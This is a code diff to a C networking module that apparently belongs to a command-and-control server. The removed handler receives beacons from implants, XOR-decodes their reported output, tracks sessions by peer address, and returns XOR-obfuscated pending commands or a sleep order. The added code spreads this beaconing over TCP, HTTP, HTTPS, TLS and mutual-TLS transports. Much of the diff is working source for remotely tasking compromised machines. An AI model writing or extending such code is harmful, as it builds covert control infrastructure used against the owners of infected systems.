@@ -1,21 +1,12 @@
 #include "Network.h"
-#include "Cipher.h"
 #include <stdio.h>
 #include <string.h>
-
-#ifdef _WIN32
-  #include <winsock2.h>
-#else
-  #include <fcntl.h>
-  #include <netinet/in.h>
-#endif
 
 int NetInit(void)
 {
 #ifdef _WIN32
     WSADATA Wsa;
-    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0)
-        return 0;
+    if (WSAStartup(MAKEWORD(2, 2), &Wsa) != 0) return 0;
 #endif
     return 1;
 }
@@ -27,84 +18,71 @@ void NetShutdown(void)
 #endif
 }
 
-NetSock NetListen(const char *Addr, int Port)
+int NetStart(const Config *C, NetHandle *H)
 {
-    NetSock Sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (Sock == NetInvalid)
-        return NetInvalid;
+    memset(H, 0, sizeof(*H));
+    H->Listener = NetInvalid;
 
-    int Opt = 1;
-    setsockopt(Sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&Opt, sizeof(Opt));
+#ifdef HAVE_OPENSSL
+    H->Ctx = NULL;
+    if (C->Mode == ModeTls || C->Mode == ModeHttps || C->Mode == ModeMtls) {
+        SSL_library_init();
+        OpenSSL_add_all_algorithms();
+        SSL_load_error_strings();
+        H->Ctx = TlsCreateCtx(C);
+        if (!H->Ctx) {
+            fprintf(stderr, "[!] TLS context init failed.\n");
+            return 0;
+        }
+    }
+#else
+    if (C->Mode == ModeTls || C->Mode == ModeHttps || C->Mode == ModeMtls) {
+        fprintf(stderr, "[!] Built without OpenSSL — recompile with -DHAVE_OPENSSL -lssl -lcrypto\n");
+        return 0;
+    }
+#endif
 
-    struct sockaddr_in Sin;
-    memset(&Sin, 0, sizeof(Sin));
-    Sin.sin_family      = AF_INET;
-    Sin.sin_addr.s_addr = inet_addr(Addr);
-    Sin.sin_port        = htons((unsigned short)Port);
-
-    if (bind(Sock, (struct sockaddr *)&Sin, sizeof(Sin)) < 0 ||
-        listen(Sock, 16) < 0) {
-        NetClose(Sock);
-        return NetInvalid;
+    H->Listener = TcpListen(C);
+    if (H->Listener == NetInvalid) {
+        fprintf(stderr, "[!] Failed to bind %s:%d\n", C->BindAddr, C->Port);
+        return 0;
     }
 
-    return Sock;
+    TcpNonBlock(H->Listener);
+    return 1;
 }
 
-void NetNonBlock(NetSock Sock)
+void NetStop(NetHandle *H)
 {
-#ifdef _WIN32
-    unsigned long F = 1;
-    ioctlsocket(Sock, FIONBIO, &F);
-#else
-    fcntl(Sock, F_SETFL, fcntl(Sock, F_GETFL, 0) | O_NONBLOCK);
+    if (H->Listener != NetInvalid)
+        NetClose(H->Listener);
+#ifdef HAVE_OPENSSL
+    if (H->Ctx)
+        SSL_CTX_free(H->Ctx);
 #endif
 }
 
-void NetHandleBeacon(NetSock Listener, Session *S)
+void NetDispatch(NetHandle *H, SessionPool *P, const Config *C)
 {
-    struct sockaddr_in Peer;
-    socklen_t          PeerLen = sizeof(Peer);
-
-    NetSock Conn = accept(Listener, (struct sockaddr *)&Peer, &PeerLen);
-    if (Conn == NetInvalid)
-        return;
-
-    char Buf[BufSize] = {0};
-    int  N            = recv(Conn, Buf, BufSize - 1, 0);
-
-    if (N <= 0) {
-        NetClose(Conn);
-        return;
+    switch (C->Mode) {
+        case ModeTcp:
+            TcpHandleBeacon(H->Listener, P);
+            break;
+        case ModeHttp:
+            HttpHandleBeacon(H->Listener, P, C);
+            break;
+#ifdef HAVE_OPENSSL
+        case ModeHttps:
+            HttpsHandleBeacon(H->Listener, P, C, H->Ctx);
+            break;
+        case ModeTls:
+            TlsHandleBeacon(H->Listener, P, C, H->Ctx);
+            break;
+        case ModeMtls:
+            TlsHandleBeacon(H->Listener, P, C, H->Ctx);
+            break;
+#endif
+        default:
+            break;
     }
-
-    Buf[N] = '\0';
-    ApplyXor(Buf, (size_t)N);
-
-    int WasActive = S->Active;
-    SessionRegister(S, inet_ntoa(Peer.sin_addr));
-
-    int IsResult = WasActive && strcmp(Buf, "Standby") != 0;
-
-    if (IsResult) {
-        memset(S->LastOutput, 0, BufSize);
-        memcpy(S->LastOutput, Buf, (size_t)N);
-        SessionNotifyOutput(S);
-    }
-
-    if (S->HasPending) {
-        size_t CmdLen = strlen(S->Pending);
-        char   Enc[BufSize];
-        memcpy(Enc, S->Pending, CmdLen);
-        ApplyXor(Enc, CmdLen);
-        send(Conn, Enc, (int)CmdLen, 0);
-        memset(S->Pending, 0, BufSize);
-        S->HasPending = 0;
-    } else {
-        char Sleep[] = "SLEEP";
-        ApplyXor(Sleep, strlen(Sleep));
-        send(Conn, Sleep, (int)strlen(Sleep), 0);
-    }
-
-    NetClose(Conn);
 }
